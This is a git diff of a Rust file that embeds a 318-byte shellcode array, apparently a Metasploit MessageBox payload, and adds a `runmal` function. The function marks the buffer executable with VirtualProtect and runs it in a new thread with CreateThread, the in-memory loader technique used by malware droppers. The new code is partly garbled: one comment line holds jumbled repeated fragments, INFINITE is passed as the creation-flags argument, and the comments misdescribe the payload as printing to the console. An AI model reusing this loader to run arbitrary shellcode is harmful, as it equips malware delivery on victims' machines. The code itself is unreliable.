@@ -1,5 +1,13 @@
-#[cfg(windows)] extern crate winapi;
-
+use winapi::um::winnt::PAGE_EXECUTE;
+use winapi::um::memoryapi::VirtualProtect;
+use winapi::um::processthreadsapi::CreateThread;
+use winapi::um::winbase::INFINITE;
+use winapi::um::winnt::HANDLE;
+use winapi::shared::minwindef::LPVOID;
+use winapi::shared::minwindef::DWORD;
+//use winapi::shared::minwindef::FALSE;
+use winapi::um::handleapi::CloseHandle;
+use std::{mem::transmute, ptr::null_mut};
 
 #[no_mangle]
 #[link_section = ".text"]
@@ -31,21 +39,44 @@ static buf: [u8; 318] = [0xfc,0x48,0x81,0xe4,0xf0,0xff,0xff,
 0x4d,0x53,0x46,0x21,0x00,0x45,0x72,0x72,0x6f,0x72,0x21,0x00,
 0x75,0x73,0x65,0x72,0x33,0x32,0x2e,0x64,0x6c,0x6c,0x00];
 
-
+/// This function will run the shellcode
+/// It will create a new thread and run the shellcode
+/// The shellcode will print "Hello, from MSF!" to the console
 #[cfg(windows)]
 fn runmal() {
-    use winapi::ctypes::{c_ulong};
-    use winapi::um::memoryapi::{VirtualProtect};
-    use winapi::um::processthreadsapi::{CreateThread};
+    let mut old_protect = 0 as DWORD; // old protection level of memory region
 
-    let  ufb: c_ulong = "PAGE_EXECUTE";
-    VirtualProtect(&buf, 318, &ufb, &buf);
-    CreateThread(318, 318, &buf);
+    unsafe {
+        // Change the protection level of the memory region to PAGE_EXECUTE
+        VirtualProtect(
+            buf.as_ptr() as *mut _,           // pointer to the memory region, in this case the shellcode array
+            318,                                 // size of the shellcode memory region
+            PAGE_EXECUTE as DWORD,         // new protection level
+            &mut old_protect             // pointer to the variable that will store the old protection level
+        );
 
+        // Create a new thread and run the shellcode
+        let thread_handle: HANDLE = CreateThread(
+            null_mut(),              // default security attributes
+            0,                              // default stack size
+            Some(
+                transmute::<_, unsafe extern "system" fn(LPVOID) -> DWORD>(buf.as_ptr() as *const _) // pointer to the shellcodeshellcode as extern "system" fn(_) -> _),   // address of the shellcodeshellcode.as_ptr()),     // address of the start of the thread's code
+            ),
+            null_mut(),                     // no parameters to pass to the thread
+            INFINITE,                   // run the thread indefinitely
+            null_mut(),                    // no thread ID is returned
+        );
+
+        if thread_handle.is_null() {
+            panic!("Failed to create thread");
+        }
+
+        CloseHandle(thread_handle);
+    }
 }
 
 #[cfg(not(windows))]
-fn runmal(){
+fn runmal() {
     println!("windows only");
 }
 
